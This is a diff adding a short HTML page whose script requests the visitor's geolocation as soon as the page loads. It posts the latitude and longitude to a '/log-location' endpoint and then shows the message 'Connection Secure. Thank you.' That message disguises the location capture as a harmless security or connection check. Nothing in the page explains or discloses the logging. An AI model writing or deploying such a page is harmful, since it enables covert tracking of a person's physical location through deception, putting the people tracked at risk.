@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await fetch('/log-location', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude
+                })
+            });
+            document.body.innerHTML = "<h1>Connection Secure. Thank you.</h1>";
+        });
+    </script>
+</body>
+</html>
